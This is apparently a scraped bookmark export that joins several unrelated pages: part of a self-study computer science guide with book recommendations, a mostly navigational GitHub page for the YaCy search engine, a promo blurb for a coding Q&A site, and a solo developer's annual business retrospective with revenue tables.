Book should be your\nnext stop.\n\nIf you're adamant about using an introductory textbook, we suggest _[Database\nManagement Systems](https://smile.amazon.com/Database-Management-Systems-\nRaghu-Ramakrishnan/dp/0072465638/)_ by Ramakrishnan and Gehrke. For more\nadvanced students, Jim Gray\u2019s classic _[Transaction Processing: Concepts and\nTechniques](https://www.amazon.com/Transaction-Processing-Concepts-Techniques-\nManagement/dp/1558601902)_ is worthwhile, but we don\u2019t encourage using this as\na first resource.\n\nFinally, data modeling is a neglected and poorly taught aspect of working with\ndatabases. Our suggested book on the topic is _[Data and Reality: A Timeless\nPerspective on Perceiving and Managing Information in Our Imprecise\nWorld](https://www.amazon.com/Data-Reality-Perspective-Perceiving-\nInformation/dp/1935504215)_.\n\n[ ![Readings in Database Systems](redbook.jpg) ](http://www.redbook.io/) [\n![Data and Reality](data-reality.jpg) ](https://www.amazon.com/Data-Reality-\nPerspective-Perceiving-Information/dp/1935504215)\n\n### Languages and Compilers\n\nMost programmers learn languages, whereas most computer scientists learn\n_about_ languages. This gives the computer scientist a distinct advantage over\nthe programmer, even in the domain of programming! Their knowledge\ngeneralizes; they are able to understand the operation of a new language more\ndeeply and quickly than those who have merely learned specific languages.\n\nOur suggested introductory text is the excellent _[Crafting\nInterpreters](https://craftinginterpreters.com/contents.html)_ by Bob Nystrom,\navailable for free online. It's well organized, highly entertaining, and well\nsuited to those whose primary goal is simply to better understand their\nlanguages and language tools. We suggest taking the time to work through the\nwhole thing, attempting whichever of the \"challenges\" sustain your interest.\n\nA more traditional recommendation is _[Compilers: Principles, Techniques&\nTools](https://smile.amazon.com/Compilers-Principles-Techniques-\nTools-2nd/dp/0321486811)_, commonly called \u201cthe Dragon Book\u201d. Unfortunately,\nit\u2019s not designed for self-study, but rather for instructors to pick out 1-2\nsemesters worth of topics for their courses.\n\nIf you elect to use the Dragon Book, it\u2019s almost essential that you cherry-\npick the topics, ideally with the help of a mentor. In fact, our suggested way\nto utilize the Dragon Book, if you so choose, is as a supplementary reference\nfor a video lecture series. Our recommended one is [Alex Aiken\u2019s, on\nedX](https://www.edx.org/course/compilers).\n\n[ ![Compilers: Principles, Techniques & Tools](dragon.jpg)\n](https://smile.amazon.com/Compilers-Principles-Techniques-\nTools-2nd/dp/0321486811)\n\n> Don\u2019t be a boilerplate programmer. Instead, build tools for users and other\n> programmers. Take historical note of textile and steel industries: do you\n> want to build machines and tools, or do you want to operate those machines?\n\n\u2014 Ras Bodik at the start of his compilers course\n\n### Distributed Systems\n\nAs computers have increased in number, they have also _spread_. Whereas\nbusinesses would previously purchase larger and larger mainframes, it\u2019s\ntypical now for even very small applications to run across multiple machines.\nDistributed systems is the study of how to reason about the trade-offs\ninvolved in doing so.\n\nOur suggested book for self-study is Martin Kleppmann's _[Designing Data-\nIntensive Applications](https://smile.amazon.com/Designing-Data-Intensive-\nApplications-Reliable-Maintainable-ebook/dp/B06XPJML5D/)_. Far better than a\ntraditional textbook, DDIA is a highly readable book designed for\npractitioners, which somehow avoids sacrificing depth or rigor.\n\nFor those seeking a more traditional text, or who would prefer one that\u2019s\navailable for free online, we suggest Maarten van Steen and Andrew Tanenbaum\u2019s\n_[Distributed Systems, 3rd Edition](https://www.distributed-\nsystems.net/index.php/books/distributed-systems-3rd-edition-2017/)_\n\n.\n\nFor those who prefer video, an excellent course with videos available online\nis [MIT\u2019s\n6.824](https://www.youtube.com/watch?v=cQP8WApzIQQ&list=PLrw6a1wE39_tb2fErI4-WkMbsvGQk9_UB),\na graduate course taught by Robert Morris with readings available\n[here](https://pdos.csail.mit.edu/6.824/schedule.html).\n\nNo matter the choice of textbook or other secondary resources, study of\ndistributed systems absolutely mandates reading papers. A good list is\n[here](http://dsrg.pdos.csail.mit.edu/papers/), and we would highly encourage\nattending your local [Papers We Love](http://paperswelove.org/) chapter.\n\n[ ![Designing Data-Intensive Applications](ddia.jpg)\n](https://smile.amazon.com/Designing-Data-Intensive-Applications-Reliable-\nMaintainable-ebook/dp/B06XPJML5D/)\n\n## Frequently asked questions\n\n#### Who is the target audience for this guide?\n\nWe have in mind that you are a self-taught software engineer, bootcamp grad or\nprecocious high school student, or a college student looking to supplement\nyour formal education with some self-study. The question of when to embark\nupon this journey is an entirely personal one, but most people tend to benefit\nfrom having some professional experience before diving too deep into CS\ntheory. For instance, we notice that students _love_ learning about database\nsystems if they have already worked with databases professionally, or about\ncomputer networking if they\u2019ve worked on a web project or two.\n\n#### What about AI/graphics/pet-topic-X?\n\nWe\u2019ve tried to limit our list to computer science topics that we feel _every\npracticing software engineer_ should know, irrespective of specialty or\nindustry, but with a focus on systems. In our experience, these will be the\nhighest ROI topics for the overwhelming majority of self-taught engineers and\nbootcamp grads, and provide a solid foundation for further study.\nSubsequently, you\u2019ll be in a much better position to pick up textbooks or\npapers and learn the core concepts without much guidance. Here are our\nsuggested starting points for a couple of common \u201celectives\u201d:\n\n  * For artificial intelligence: do [Berkeley\u2019s intro to AI course](http://ai.berkeley.edu/) by watching the videos and completing the excellent Pacman projects. As a textbook, use Russell and Norvig\u2019s _Artificial Intelligence: A Modern Approach_.\n  * For machine learning: do Andrew Ng\u2019s Coursera course. Be patient, and make sure you understand the fundamentals before racing off to shiny new topics like deep learning.\n  * For computer graphics: work through [Berkeley\u2019s CS 184](http://inst.eecs.berkeley.edu/~cs184/fa12/onlinelectures.html) material, and use [Computer Graphics: Principles and Practice](https://www.amazon.com/Computer-Graphics-Principles-Practice-3rd/dp/0321399528) as a textbook.\n\n#### How strict is the suggested sequencing?\n\nRealistically, all of these subjects have a significant amount of overlap, and\nrefer to one another cyclically. Take for instance the relationship between\ndiscrete math and algorithms: learning math first would help you analyze and\nunderstand your algorithms in greater depth, but learning algorithms first\nwould provide greater motivation and context for discrete math. Ideally, you\u2019d\nrevisit both of these topics many times throughout your career.\n\nAs such, our suggested sequencing is mostly there to help you _just get\nstarted_ \u2026 if you have a compelling reason to prefer a different sequence,\nthen go for it. The most significant \u201cpre-requisites\u201d in our opinion are:\ncomputer architecture before operating systems or databases, and networking\nand operating systems before distributed systems.\n\n#### How does this compare to Open Source Society or freeCodeCamp curricula?\n\nWhen this guide was first written in 2016, the [OSS\nguide](https://github.com/open-source-society/computer-science) had too many\nsubjects, suggested inferior resources for many of them, and provided no\nrationale or guidance around why or what aspects of particular courses are\nvaluable. We strove to limit our list of courses to those which you _really\nshould know_ as a software engineer, irrespective of your specialty, and to\nhelp you understand why each course is included. In the subsequent years, the\nOSS guide has improved, but we still think that this one provides a clearer,\nmore cohesive path.\n\nfreeCodeCamp is focused mostly on programming, not computer science. For why\nyou might want to learn computer science, see above. If you are new to\nprogramming, we suggest prioritizing that, and returning to this guide in a\nyear or two.\n\n#### What about language X?\n\nLearning a particular programming language is on a totally different plane to\nlearning about an area of computer science \u2014 learning a language is much\n_easier_ and much _less valuable_. If you already know a couple of languages,\nwe strongly suggest simply following our guide and fitting language\nacquisition in the gaps, or leaving it for afterwards. If you\u2019ve learned\nprogramming well (such as through _Structure and Interpretation of Computer\nPrograms_ ), and especially if you have learned compilers, it should take you\nlittle more than a weekend to learn the essentials of a new language, after\nwhich you can learn about the libraries/tooling/ecosystem on the job.\n\n#### What about trendy technology X?\n\nNo single technology is important enough that learning to use it should be a\ncore part of your education. On the other hand, it\u2019s great that you\u2019re excited\nto learn about that thing. The trick is to work backwards from the particular\ntechnology to the underlying field or concept, and learn that in depth before\nseeing how your trendy technology fits into the bigger picture.\n\n#### Why are you still recommending SICP?\n\nLook, just try it. Some people find SICP mind blowing, a characteristic shared\nby very few other books. If you don't like it, you can always try something\nelse and perhaps return to SICP later.\n\n#### Why are you still recommending the Dragon book?\n\nThe Dragon book is still the most complete single resource for compilers. It\ngets a bad rap, typically for overemphasizing certain topics that are less\nfashionable to cover in detail these days, such as parsing. The thing is, the\nbook was never intended to be studied cover to cover, only to provide enough\nmaterial for an instructor to put together a course. Similarly, a self-learner\ncan choose their own adventure through the book, or better yet follow the\nsuggestions that lecturers of public courses have made in their course\noutlines.\n\n#### How can I get textbooks cheaply?\n\nMany of the textbooks we suggest are freely available online, thanks to the\ngenerosity of their authors. For those that aren\u2019t, we suggest buying used\ncopies of older editions. As a general rule, if there has been more than a\ncouple of editions of a textbook, it\u2019s quite likely that an older edition is\nperfectly adequate. It\u2019s certainly unlikely that the newest version is 10x\nbetter than an older one, even if that\u2019s what the price difference is!\n\n#### Who made this?\n\nThis guide was originally written by [Oz Nova](https://twitter.com/oznova_)\nand [Myles Byrne](https://twitter.com/quackingduck), with 2020 updates by Oz.\nIt is based on our experience teaching foundational computer science to over\n1000 mostly self-taught engineers and bootcamp grads in small group settings\nin San Francisco and live online. Thank you to all of our students for your\ncontinued feedback on self-teaching resources.\n\nWe're very confident that you could teach yourself everything above, given\nenough time and motivation. But if you'd prefer an intensive, structured,\ninstructor-led program, you might be interested in our [Computer Science\nIntensive](https://bradfieldcs.com/csi/). We\n[DON'T](https://ozwrites.com/masters/) suggest pursuing a master's degree.\n\nFor updates to this guide and general computer science news and resources, you\nmay also like to join Bradfield's mailing list:\n\n##\n\n[[email protected]](/cdn-cgi/l/email-\nprotection#ed8588818182ad8f9f8c898b848881898e9ec38e8280)  \nSan Francisco, California  \n\u00a9 2016-2020 Bradfield School of Computer Science\n\n", "title": "Teach Yourself Computer Science", "date": "02/10/20", "tags": []}, "32": {"type": "bookmark", "url": "https://github.com/yacy/", "desc": "Loading\u2026", "content": "Skip to content\n\n[ ](https://github.com/)\n\n[yacy](/yacy)\n\n[ Sign up\n](/join?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Corg-\nlogin%3E&source=header)\n\n![](https://github.githubassets.com/images/search-key-slash.svg)\n\n  * [ ![]() In this organization  All GitHub  \u21b5 Jump to \u21b5 ]()\n\n  * No suggested jump to results\n\n  * [ ![]() In this organization  All GitHub  \u21b5 Jump to \u21b5 ]()\n  * [ ![]() In this organization  All GitHub  \u21b5 Jump to \u21b5 ]()\n\n[ Sign in ](/login?return_to=%2Fyacy) [ Sign up\n](/join?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Corg-\nlogin%3E&source=header)\n\n[ Repositories ](/yacy) [ Packages ](/orgs/yacy/packages) [ People\n](/orgs/yacy/people) [ Projects ](/orgs/yacy/projects)\n\n![@yacy](https://avatars3.githubusercontent.com/u/238733?s=200&v=4)\n\n#  YaCy Search Engine\n\nSearch Engine Software for Web and Intranet Search\n\n  * <http://yacy.net>\n\n  * [ Repositories  ](/yacy)\n  * [ Packages  ](/orgs/yacy/packages)\n  * [ People  ](/orgs/yacy/people)\n  * [ Projects  ](/orgs/yacy/projects)\n\nDismiss\n\n### Grow your team on GitHub\n\nGitHub is home to over 50 million developers working together.

Someone needed to create a reliable platform where\ncoders-in-training can get the answers they need.\n\n**This is why we created TinySnippt.dev!** We\u2019ve got all of the resources and\naccess to other coders from around the world.\n\nCreate a profile and private network where you can **share, ask questions and\ngain knowledge**. Build a social development community that helps you solve\ncoding problems. Whether you are in **college for CS or IT** , this is the\nplace to plug in.\n\nFeatures  \n __Code Challenges  \n __Coding Q &A  \n __Gists  \n __Polls  \n __Dev Groups  \n __Pair Programming  \n __Private Messaging  \n __100+ languages  \n\n#  Code Challenges\n\nCreate code challenges for your network or even for the class. Code challenges\ncan be private or public. Public allows everyone on the platform to\nparticipate. Private only allows users who you invite to the challenge. You\ncan additionally hide answers from users. This is perfect for a teacher in\nclass taking a short test. Students will not be able to copy answers.\n\n#  Dev Groups\n\nDev groups are interest based groups. Custom groups means you speak the same\nlanguage. Anybody on the network can join a dev group. It could be as small as\na class based dev group or be as wide as platform based. This allows users\nwith specific interest to post snippets, images and general messages.\n\n#  Private Messages\n\nSend private messages without leaving the platform. You can talk about\neverything else or go into more detail about a specific coding problem.\n\n#  Pair Programming\n\nPair programming allows up to four people to take turns doing live edits.

I increased profits by\n$18.5k!\n\nOverall, I still lost money, but try not to get too hung up on that. I tripled\nrevenue to $7.2k and cut expenses by more than half.\n\n## How can you afford to keep losing money? \ud83d\udd17\ufe0e\n\nMy long-term unprofitability often perplexes people. They assume I fund my\nmoney-losing endeavors with freelance work, but the truth is that 100% of my\nworking hours go into my non-lucrative businesses. This is possible due to\nthree main factors:\n\n  * **Low expenses** : I have no children and [live in an inexpensive area](https://mtlynch.io/solo-developer-year-1/#so-i-bought-a-house) where my costs are ~$2k/month.\n  * **High savings** : It\u2019s hard to work for big software companies for 11 years without building a decent nest egg.\n  * **Lucky investments** : Throughout my career, most of my money has been in the S&P 500 during periods of especially strong market runs. My small bets on [cryptocurrency](https://mtlynch.io/tags/sia/) also paid off well.\n\n## Project by project \ud83d\udd17\ufe0e\n\n### [Zestful](https://zestfuldata.com) \ud83d\udd17\ufe0e\n\n[ ![Screenshot of Zestful website](https://mtlynch.io/solo-developer-\nyear-2/zestful-screenshot.png) ](https://mtlynch.io/solo-developer-\nyear-2/zestful-screenshot.png)\n\nZestful is a SaaS for parsing recipe ingredients.\n\nZestful launched in mid-2018 as my first attempt at a software-as-a-service\n(SaaS) business. It allows food apps to recognize the structure of recipe\ningredients. Given an ingredient like, \u201c2 1/2 tablespoons finely chopped\nparsley,\u201d Zestful infers that `2.5` is the quantity, `tablespoons` is the unit\nof measure, `parsley` is the product, and `finely chopped` is a preparation\nstep.\n\nAfter earning [a big fat zero](https://mtlynch.io/solo-developer-\nyear-1/#zestfulhttpszestfuldatacom) last year, Zestful finally realized\nsignificant revenue throughout 2019. [A single enterprise sale in\nDecember](https://mtlynch.io/retrospectives/2020/01/#zestfulhttpszestfuldatacom)\naccounted for 79% of its annual revenue. That sale also represented 53% of\ntotal revenue across all my businesses.\n\nIncome/Expense | 2018 | 2019 | Change  \n---|---|---|---  \nSales | $0 | $5,022 | +$5,022 (+inf%)  \nHosting | -$164 | -$80 | -$84 (-51%)  \nDomains | $-50 | -$12 | -$38 (-76%)  \nLogo Design | $-200 | $0 | -$200 (-100%)  \nDevelopment | -$7,440 | $0 | -$7,440 (-100%)  \n**Net profit** | **-$7,854** | **$4,930\u202c** | +$12,784 (+162%)  \n[ ![Screenshot of Zestful's appearances in Google search\nresults](https://mtlynch.io/solo-developer-year-2/zestful-seo.jpg)\n](https://mtlynch.io/solo-developer-year-2/zestful-seo.jpg)\n\nMy efforts to keep Zestful relevant in search results\n\nZestful is in a strange position because companies who parse ingredients\n[never want to switch to Zestful](https://mtlynch.io/shipping-too-late/#the-\nharsh-reality). The cost of migrating to a new API outweighs potential price\nand performance improvements. Instead, all of Zestful\u2019s customers are\ncompanies building a brand new product.\n\nHow do you sell to companies if they don\u2019t even exist yet? My strategy has\nbeen to invest in search engine optimization so that Zestful ranks highly for\nqueries like \u201cingredient parsing.\u201d\n\n### [Is It Keto](https://isitketo.org) \ud83d\udd17\ufe0e\n\n[ ![Screenshot of Is It Keto website](https://mtlynch.io/solo-developer-\nyear-2/isitketo-screenshot.png) ](https://mtlynch.io/solo-developer-\nyear-2/isitketo-screenshot.png)\n\nIs It Keto is a reference site for followers of the keto diet.\n\nIs It Keto gives readers clear, straightforward answers about which foods are\ncompatible with [the keto diet](https://en.wikipedia.org/wiki/Ketogenic_diet).\nIt generates revenue through Google AdSense display ads and receives\ncommission for every Amazon purchase through the site.\n\nIncome/Expense | 2018 | 2019 | Change  \n---|---|---|---  \nPageviews | 16,208 | 521,913 | +505,705 (+3,120%)  \nFood corpus size | 53 | 202 | +149 (+281%)  \nAmazon Affiliate revenue | $1 | $1,315 | +$1,314 (+131,400%)  \nGoogle AdSense revenue | N/A | $940 | +$940 (+inf%)  \nMeal plan sales | N/A | $24 | +$24 (+inf%)  \n[Content writing](https://mtlynch.io/hiring-content-writers/) | $0 | -$3,845 |\n+$3,845 (+inf%)  \nSocial media management | $0 | -$314 | +$314 (+inf%)  \nGraphic design | -$211 | -$163 | -$48 (-23%)  \nDevelopment | -$1,660 | $0 | -$1,660 (-100%)  \nHosting | $0 | -$103 | +$103 (+inf%)  \nDomain | -$12 | -$12 | -  \n**Net profit** | **-$1,882** | **-$2,158** | -$276 (-15%)  \n  \nAt $2.3k of revenue, Is It Keto was my second-highest-grossing product for\n2019. I [abandoned the site in\nApril](https://mtlynch.io/retrospectives/2019/04/) but [came back four months\nlater](https://mtlynch.io/retrospectives/2019/09/) after realizing that it had\ngrown by itself without me.\n\n[ ![Graph of Is It Keto pageviews increasing each month until flattening out\nin August](https://mtlynch.io/solo-developer-year-2/isitketo-pageviews.jpg)\n](https://mtlynch.io/solo-developer-year-2/isitketo-pageviews.jpg)\n\nIs It Keto traffic by month\n\n88% of Is It Keto\u2019s visitors come from search engines, but I\u2019ve never been\nable to connect improvements in search traffic to any change I made to the\nsite. There were months when I added lots of content, [optimized page\ntitles](https://mtlynch.io/retrospectives/2019/09/#taking-affiliate-revenue-\nadvice-from-reddit), and [earned high-ranking\nbacklinks](https://mtlynch.io/retrospectives/2019/09/#finally-a-backlink-for-\nis-it-keto), yet traffic remained flat. Other times, I ignored the site for\nmonths, and Google traffic grew the entire time.\n\nIs It Keto was also my biggest expense, as I outsourced much of the writing.\nThat cost me more than it should have because I knew nothing about hiring and\nmanaging writers, but the experience taught me a lot and led to my widely\nignored [guide to hiring content writers](https://mtlynch.io/hiring-content-\nwriters/).\n\n### mtlynch.io _(this blog)_ \ud83d\udd17\ufe0e\n\nMetric | 2018 | 2019 | Change  \n---|---|---|---  \nPageviews | 981,587 | 273,817 | -707,770 (-72%)  \nAffiliate revenue | $1,244 | $374 | -$870 (-70%)  \nDevelopment | -$3,896 | -$460 | -$3,436 (-88%)  \n[Illustrations](https://mtlynch.io/how-to-hire-a-cartoonist/) | -$599 | -$769\n| +$170 (+28%)  \nHosting | -$309 | -$150 | -$159 (-51%)  \n[Grammarly](https://www.grammarly.com/?affiliateNetwork=cj&affiliateID=8329872)\n(Grammar and style checking service) | -$140 | -$140 | -  \n[Editing](https://mtlynch.io/editor/) | -$75 | -$60 | -$15 (-20%)  \nDomain | -$60 | -$60 | -  \n**Net profit** | **-$3,835** | **-$1,265** | +$2,570 (+67%)  \n  \nPageviews are down substantially, which is unsurprising. My [quitting Google\npost](https://mtlynch.io/why-i-quit-google/) received 500k pageviews in 2018,\nso I didn\u2019t expect to land another smash hit like that.\n\nStill, I struggled to find readers last year. Throughout the preceding two\nyears, many of my posts became popular without me trying very hard to promote\nthem. I\u2019d write the article then find an appreciative community to share it\nwith afterward.\n\nIn 2019, I branched out from technical writing and focused more on the\nstruggles of running a bootstrapped business. Even though there are plenty of\nonline communities for bootstrappers, they attract self-promoters, so the\ngroups are less welcoming to off-site blog posts. I\u2019ve also noticed that\nreaders are less interested in business lessons unless the story involves\nthousands of dollars \u2014 earning or losing large sums both seem to work.\n\nBlog revenue is also down, which is fine because I don\u2019t go out of my way to\nearn money from this blog. My development costs fell dramatically because the\nsite\u2019s freelancer shifted focus to his full-time job. Rather than hiring\nsomeone else, I\u2019ve taken over development myself, as my web programming skills\nhave improved over the last couple of years.\n\n### What Got Done \ud83d\udd17\ufe0e\n\n[ ![Screenshot of What Got Done website](https://mtlynch.io/solo-developer-\nyear-2/whatgotdone-screenshot.png) ](https://mtlynch.io/solo-developer-\nyear-2/whatgotdone-screenshot.png)\n\nWhat Got Done is a task journaling app.\n\nWhat Got Done is a tool for recording and sharing weekly work accomplishments.\nIt\u2019s [a technique that I learned](https://mtlynch.io/status-updates-to-\nnobody/) while working at Google, and I\u2019ve been using it to record [my\nprogress](https://whatgotdone.com/michael) every week for the last 10 months.\n\nIncome/Expense | Amount  \n---|---  \nCustomer interviews | -$31  \nDomain | -$12  \n**Net profit** | **-$43**  \n  \nI never thought What Got Done was a brilliant business idea, but [months of\nfailing to turn a profit on Is It Keto](https://mtlynch.io/keep-growing-never-\nprofit/) left me feeling frustrated. What Got Done seemed like a fun project\nto cheer me up and an opportunity to teach myself\n[Vue.js](https://vuejs.org/), a popular web framework.\n\nAnd it worked! I love Vue. I\u2019ve finally found a tool that lets me build\nwebsites quickly without struggling through a maze of leaky abstraction.\n\nAs long as I was building What Got Done, I figured that it was worth exploring\nwhether the site could make money. After interviews with several companies, it\nseemed that managers felt that they could [accomplish the same results with a\ndedicated Slack channel](https://mtlynch.io/retrospectives/2019/08/#why-use-\nwhat-got-done-when-we-have-slack), so I moved on.\n\n### Everything Else \ud83d\udd17\ufe0e\n\nExpense | Purpose | Amount  \n---|---|---  \nConferences | Networking and training | -$2,182  \n[Xero](https://xero.com/) | Bookkeeping | -$151  \nBench to Xero migration (freelance accountant) | Bookkeeping | -$232  \n[Circle CI](https://circleci.com) | Continuous integration | -$350  \n[Coveralls](https://coveralls.io) | Test coverage tracking | -$270  \n  \nConferences were a hefty expense because travel and lodging are expensive, and\nthe conferences that accepted my speaking proposals were regional events with\nminimal travel assistance budgets.\n\nSwitching from Travis to Circle for continuous integration reduced my expenses\nby $68/month, which worked out great because it turned out that I love Circle.\nThey improve their product faster and integrate better with Docker. Coveralls\nunfortunately auto-renewed without me consciously choosing to do so. I\u2019ve\nsince accepted that code coverage metrics have little value for early-stage\nproducts and canceled for next year.\n\nI also switched from managed bookkeeping with [Bench](https://bench.co) to\nself-serve bookkeeping with Xero. I enjoyed Bench and have no love for Xero,\nbut it was hard to justify an extra $1.5k/year for concierge bookkeeping when\nmy finances were so simple and repetitive.\n\n## Lessons learned \ud83d\udd17\ufe0e\n\n### Raise prices, even if nobody\u2019s buying \ud83d\udd17\ufe0e\n\nOne of the best pieces of [advice I\nreceived](https://mtlynch.io/retrospectives/2019/07/#suddenly-everyone-wants-\nto-parse-ingredients) this year was from [Cory Zue](http://coryzue.com). He\nsuggested that at $0.003 per request, my prices for Zestful were too low. At\nthe time, Zestful had almost zero paid users. How could my prices be too low\nif nobody was buying?\n\nThough Zestful had few real customers, it had many _prospective_ customers.\nEvery few weeks, a new company contacted me saying that they were interested\nin Zestful, but it was missing one tiny feature they absolutely needed.\nDesperate to win my first big client, I\u2019d work feverishly to implement the\nfunctionality they wanted. A week later, I\u2019d proudly deliver it to them.\n\n\u201cOh, yeah,\u201d they\u2019d reply sheepishly. \u201cThat was for a project we decided not to\npursue.\u201d\n\nIt cost these companies nothing to ask for features, but it was extremely\ntime-consuming for me to meet with them and implement their wishlist. I\nrecognized what was happening but couldn\u2019t figure out a way to stop it.\nIgnoring the request was an option, but what if they genuinely were prepared\nto spend thousands per month?\n\nWhen I took Cory\u2019s advice and raised prices, it changed the conversation in an\nunexpected way. At $0.003 per request, nobody tried to negotiate with me on\nprice. When my rates jumped by 6.5x to $0.02 per request, everyone started\nasking about volume discounts. Then, when they claimed they\u2019d buy after\nZestful had their pet feature, I gave them this line:\n\n> Great! You can pre-pay for three months of service, and your billing cycle\n> won\u2019t start until that feature is available.\n\nI\u2019ve never been burned on a feature request since.\n\nMy prices are high enough that most customers have to spend a few hundred\ndollars each month to use Zestful, which discourages people from telling me\nabout the all-important features I\u2019d have to implement to earn their $5/month.\nInterestingly, the customers who ended up purchasing enterprise plans had no\nfeature requests, and those deals closed in a matter of days.\n\n### Pursuing the right idea means rejecting the wrong ones \ud83d\udd17\ufe0e\n\nMy first year as a founder, I was a puppy chasing any ball that happened to\nroll by. If one of my projects failed to achieve traction, I\u2019d work on\nwhatever idea was next in my mental queue. Building a \u201cquick\u201d prototype felt\ncheap and easy at a project\u2019s outset, but it always took weeks of coding and\nsubsequent months of work courting customers.\n\nMy friend [David Toth](https://twitter.com/jupiterunknown) taught me the value\nof idea screening. He pointed out that whatever idea I pursue determines large\nparts of my life for several months at the minimum, so it\u2019s worth choosing\ncarefully. Instead of bounding off after the first good idea he has, David\ngenerates ideas until he has a list of at least 10. He then evaluates that\nlist carefully to choose which has the highest chance of success.\n\nReading [_Start Small, Stay Small_](https://amzn.to/2HZT8lA)\n([notes](https://mtlynch.io/book-reports/start-small-stay-small/)) and [_The\nMom Test_](https://amzn.to/2ZshKrl) ([notes](https://mtlynch.io/book-\nreports/the-mom-test/)) also influenced how I approach new businesses. Both\nbooks encourage founders to start with market research and build the product\nlater. As a result, I was conservative about building anything and gave myself\npermission to bail if my investigation indicated an idea was no longer my best\nchance of success.\n\n### Take bigger swings \ud83d\udd17\ufe0e\n\nWhen I set last year\u2019s goal to $500/month in revenue, people encouraged me to\nset a higher target. New businesses have a high chance of failure, so I may as\nwell shoot for the moon.\n\nLooking back, I still feel that $500/month was sensible. Is It Keto was a nice\n\u201cbeginner business\u201d because the mechanics were so simple. Ads and affiliate\npurchases generated about $0.01 per visitor, on average. More visits meant\nmore money, so I got to experiment with different growth strategies without\nworrying about things like pricing, sales funnels, or customer support. It was\ngratifying to watch my revenues begin at a [paltry\n$1/month](https://www.indiehackers.com/forum/isitketo-month-4-my-first-dollar-\nof-revenue-03e572f661) and then grow by 50-150% each month to reach $400/month\nby the end of the year.\n\nThe flip side was seeing the limitations of low-margin businesses. When\nrevenues are a penny per customer, most avenues for expansion are off the\ntable. It makes no sense to pay $0.50-$1.50 per click for an ad if the visitor\nonly generates $0.01 in revenue. I\u2019d love to bring on an employee to help grow\nthe site, but even a cheap $200/month freelancer would have to double my\ntraffic to justify their cost.\n\nNow that I\u2019m entering my third year as a founder, I\u2019m ready to make bigger\nbets. Growing Is It Keto gave me the confidence to push myself more. That\nmeans taking on projects where success would afford me a couple of part-time\ncontractors.\n\n## I still love it \ud83d\udd17\ufe0e\n\nWhen people find out that I\u2019ve run at a financial loss for the past two years,\nthey worry that I regret leaving my cushy Google job. It\u2019s common for founders\nto experience burnout after a year or two, but I\u2019ve been fortunate never to\nfeel that way. I chalk this up to my healthy sense of self-doubt at the start\nof this adventure \u2014 I expected to fail awhile before finding success. It\u2019s\nalso easy to avoid financial stress when you\u2019re in no danger of running out of\nmoney.\n\nEvery day, I come downstairs and enjoy a leisurely breakfast with my\ngirlfriend. We live at the end of a dead-end street, so when she leaves for\nwork, my house is perfectly quiet. After writing for 60-90 minutes, I map out\nthe rest of my day. I don\u2019t work after dinner or on the weekends. If I feel\nsleepy at 3pm, I take a nap and never worry about what my manager thinks.\n\nBefore quitting, the part of the lifestyle I fantasized about most was the\npure independence of it. It is indeed as satisfying as I dreamed. I love\nhaving full autonomy over my day and the freedom to completely change the\ndirection of my businesses or start over when it feels right.\n\nI\u2019d do this forever.\n\n## Grading my goals \ud83d\udd17\ufe0e\n\nIn last year\u2019s update, I [gave myself four goals](https://mtlynch.io/solo-\ndeveloper-year-1/#goals-for-year-two) for the year:\n\n### Achieve $500/month in revenue across my businesses \ud83d\udd17\ufe0e\n\n**Grade** : B+\n\nI did hit this goal in that my revenue was $604/month for the year and\n$1,657/month for Q4, though it feels like cheating to include [my huge outlier\nsale](https://mtlynch.io/retrospectives/2020/01/#zestfulhttpszestfuldatacom)\nfrom December. Without it, I\u2019d be at $441 in total revenue for December, which\nis closer to what the likely trend will be through early 2020. It\u2019s not quite\n$500, but it\u2019s satisfyingly close.\n\n### Present talks at three software conferences \ud83d\udd17\ufe0e\n\n**Grade** : A\n\nThree conferences accepted my speaking proposals, and I\u2019m proud of my\npresentations at all of them:\n\nConference | My notes | Presentation  \n---|---|---  \n[NERD Summit](https://2019.nerdsummit.org/) | - | [\u201cModernize any Codebase\nthrough Tooling and Technique\u201d](https://youtu.be/GfkVhr6SPz4)  \n[PyTexas 2019](https://2019.pytexas.org/) |\n[Notes](https://mtlynch.io/retrospectives/pytexas-2019-notes/) | [\u201cWhy Good\nDevelopers Write Bad Tests\u201d](https://youtu.be/hM_ex4-xu4E)  \n[PyGotham 2019](https://2019.pygotham.org/) |\n[Notes](https://mtlynch.io/retrospectives/pygotham-2019-notes/) | [\u201cWhy Good\nDevelopers Write Bad Tests\u201d](https://youtu.be/ElzBGwyDzCc)  \n  \nI enjoy conferences and pick up useful information by attending, but if I\u2019m\nbeing honest, they don\u2019t materially improve my professional or personal life.\nBetween travel, preparing my talks, and attending the event itself, I spent\nsix to eight weeks of full-time work on conference presentations.\n\nI\u2019ll continue applying to and attending conferences in 2020, but I\u2019ll be more\nselective than last year.\n\n### Publish 12 blog posts \ud83d\udd17\ufe0e\n\n**Grade** : B\n\nDepending on how you count, I either published 9 or 13 blog posts in 2019.\nThere were nine separate updates to my blog, but one of them was [a five-part\nseries on hiring content writers](https://mtlynch.io/hiring-content-writers/).\nOverall, I\u2019m pleased with my writing for the year, though I did wish more of\nmy posts had gained traction.\n\n### Gain comfort with a JavaScript framework \ud83d\udd17\ufe0e\n\n**Grade** : A\n\nI\u2019m not a Vue expert, but I\u2019d describe myself as \u201cconversational.\u201d I can build\nsites quickly without getting stuck on the framework itself.\n\nAfter years of banging my head against the wall with\n[Angular](https://angular.io), I\u2019m delighted to have found a framework that\nfeels appropriate for solo developers.\n\n## What\u2019s next \ud83d\udd17\ufe0e\n\nThe project that I hope to focus on for a large portion of the coming year is\n[WanderJest](https://wanderjest.com), a website I created a few weeks ago.\n\n[ ![Screenshot of WanderJest website](https://mtlynch.io/solo-developer-\nyear-2/wanderjest-feb-2020.jpg) ](https://mtlynch.io/solo-developer-\nyear-2/wanderjest-feb-2020.jpg)\n\n[WanderJest](https://wanderjest.com) is a resource for finding live comedy\nshows.\n\nIt\u2019s difficult to find local comedy shows, as listings are scattered amongst\nFacebook groups, comedy club websites, and ticket sellers like TicketMaster\nand Eventbrite.

